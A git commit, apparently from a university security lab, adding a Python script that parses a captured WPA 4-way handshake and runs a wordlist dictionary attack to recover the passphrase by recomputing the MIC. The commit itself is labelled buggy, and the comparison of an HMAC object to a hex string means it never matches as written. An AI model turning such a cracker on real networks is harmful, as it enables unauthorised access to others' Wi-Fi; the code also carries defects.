01c42f91be93cb2581c4a28b91d170b46740da9c
llievre <loic.lievre@heig-vd.ch>
2021-04-15 17:08:59 +0200

    step 2 buggy

---
+++ files/scaircrack.py
@@ -0,0 +1,97 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Derive WPA keys from Passphrase and 4-way handshake info
+
+Calcule un MIC d'authentification (le MIC pour la transmission de données
+utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
+sha-1 pour WPA2 ou MD5 pour WPA)
+"""
+
+__author__      = "Abraham Rubinstein et Yann Lederrey"
+__copyright__   = "Copyright 2017, HEIG-VD"
+__license__ 	= "GPL"
+__version__ 	= "1.0"
+__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__status__ 		= "Prototype"
+
+from scapy.all import *
+from binascii import a2b_hex, b2a_hex
+#from pbkdf2 import pbkdf2_hex
+from pbkdf2 import *
+from numpy import array_split
+from numpy import array
+import hmac, hashlib
+
+def customPRF512(key,A,B):
+    """
+    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
+    """
+    blen = 64
+    i    = 0
+    R    = b''
+    while i<=((blen*8+159)/160):
+        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
+        i+=1
+        R = R+hmacsha1.digest()
+    return R[:blen]
+
+# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+wpa=rdpcap("wpa_handshake.cap") 
+
+#get packets from list
+packetBroadcast = wpa[0] #beacon to find ssid
+packetHS1 = wpa[5] #handshake 1
+packetHS2 = wpa[6] #handshake 2
+packetHS4 = wpa[8] #handshake 4
+
+# Important parameters for key derivation - most of them can be obtained from the pcap file
+A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+ssid        = packetBroadcast.info.decode()
+APmac       = a2b_hex(packetHS1.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
+Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
+
+# Authenticator and Supplicant Nonces
+ANonce      = packetHS1.load[13:45] #on trouve le ANonce dans le handshake 1
+SNonce      = Dot11Elt(packetHS2).load[65:97] #
+
+# This is the MIC contained in the 4th frame of the 4-way handshake
+# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
+
+mic_to_test = Dot11Elt(packetHS4).load[129:-2].hex() #on trouve le mic dans le handshake 4
+
+B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
+
+#on recupere la data dans le handshake 4 et on remplace le mic du payload par 0
+data        = a2b_hex(Dot11Elt(packetHS4).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test))) #cf "Quelques détails importants" dans la donnée
+
+
+ssid = str.encode(ssid)
+
+fileWords = open("wordslist.txt", "r")
+
+for word in fileWords.readlines():
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    passPhrase = str.encode(word)
+    
+    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
+
+    #expand pmk to obtain PTK
+    ptk = customPRF512(pmk,str.encode(A),B)
+
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+    if mic == mic_to_test:
+        print ("\nResults of the key expansion")
+        print ("=============================")
+        print ("PMK:\t\t",pmk.hex(),"\n")
+        print ("PTK:\t\t",ptk.hex(),"\n")
+        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
+        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
+        print ("TK:\t\t",ptk[32:48].hex(),"\n")
+        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
+        print ("MIC:\t\t",mic.hexdigest(),"\n")
+    else:
+        print("Wrong passphrase : " + word)
